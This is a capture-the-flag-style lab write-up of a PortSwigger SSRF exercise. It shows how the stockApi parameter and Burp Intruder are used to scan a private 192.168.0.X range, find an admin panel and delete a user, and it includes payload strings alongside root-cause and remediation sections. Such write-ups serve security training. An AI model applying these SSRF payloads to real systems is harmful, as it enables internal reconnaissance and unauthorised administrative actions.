# Lab 02 — Basic SSRF Against Another Back-End System

[![Category](https://img.shields.io/badge/Category-SSRF-red)]()
[![Type](https://img.shields.io/badge/Type-Internal%20Network%20SSRF-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-High-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/ssrf)

> Part of the [SSRF Labs](./README.md) series — PortSwigger Web Security Academy.

---


## 1. Overview

| Field | Detail |
|---|---|
| **Vulnerability Class** | Server-Side Request Forgery (In-band / Internal Network Scanning) |
| **Weakness (CWE)** | CWE-918 |
| **Difficulty** | Apprentice |
| Source | PortSwigger Web Security Academy |
| **Objective** | Scan the internal `192.168.0.X` range for an admin interface on port 8080 and delete user `carlos` |

## 2. Summary

This lab extends Lab 01: instead of targeting the server's own loopback interface, the goal is to use the same `stockApi` SSRF primitive to reach a back-end system on the organization's private network that has no direct route from the internet. Because the exact internal IP hosting the admin panel is unknown, the stock-checker functionality is used as a blind proxy to brute-force the private IP range with Burp Intruder until a responsive admin interface is found.

## 3. Proof of Concept (PoC)

1. Open any product page, click **Check stock**, capture the `POST /product/stock` request, and send it to Burp Intruder.
2. Set the `stockApi` value to `http://192.168.0.1:8080/admin`, then mark the final octet of the IP address as the Intruder payload position: `http://192.168.0.§1§:8080/admin`.
3. Configure the payload type as **Numbers**, with `From=1`, `To=255`, `Step=1`.
4. Run the attack and sort results by HTTP status code.
5. Identify the single request returning `200 OK` (all others typically return `500`/timeouts) — this reveals the internal host serving the admin panel.
6. Send that request to Repeater, append the delete path to `stockApi`, and send to delete the target user.

## 4. Evidence

**Intruder payload position:**
```
stockApi=http://192.168.0.§1§:8080/admin
```

**Successful host identified (example):**
```
stockApi=http://192.168.0.143:8080/admin
```
Response: `200 OK`, admin panel HTML returned — all other octets (1–255 excluding this one) return `500 Internal Server Error` or time out.

**Deletion request:**
```
stockApi=http://192.168.0.143:8080/admin/delete?username=carlos
```
Response: `200 OK`, lab marked **Solved**.

## 5. Root Cause Analysis

**Attacker perspective:** The vulnerable server acts as an open, unrestricted proxy into the private subnet it has network access to. Since private IP ranges (`192.168.0.0/24`) are not directly reachable from the internet, they are often assumed safe and left with weaker (or no) authentication. By iterating the full octet range, the attacker effectively turns the vulnerable application into a port/host scanner for internal infrastructure.

**Defender perspective:** The same root causes from Lab 01 apply — unrestricted outbound fetching driven entirely by user input — but this case additionally reveals that internal services (reachable only via private IPs) were deployed with the assumption that network isolation alone is sufficient protection, without additional authentication.

## 6. Impact

Beyond accessing one known endpoint, this technique allows an attacker to map an organization's internal network topology from the outside and discover services that were never intended to be internet-facing. Combined with weak or absent authentication on internal systems (common because of the "it's not exposed anyway" assumption), this can lead to full compromise of backend infrastructure.

## 7. Remediation

- Apply the same input-handling fixes as Lab 01 (no attacker-controlled destination URLs for server-side fetches).
- Internal services should never assume their network position (`192.168.0.0/16`, etc.) is a substitute for authentication — apply the same access controls as internet-facing systems ("zero trust" posture).
- Use egress filtering/firewall rules on the application server so it can only reach the specific internal hosts/ports it legitimately needs, rather than the entire private range.
- Monitor and alert on unusual volumes of outbound connection attempts from application servers, which can indicate active internal reconnaissance via SSRF.

## 8. References

- [PortSwigger — Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf)
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)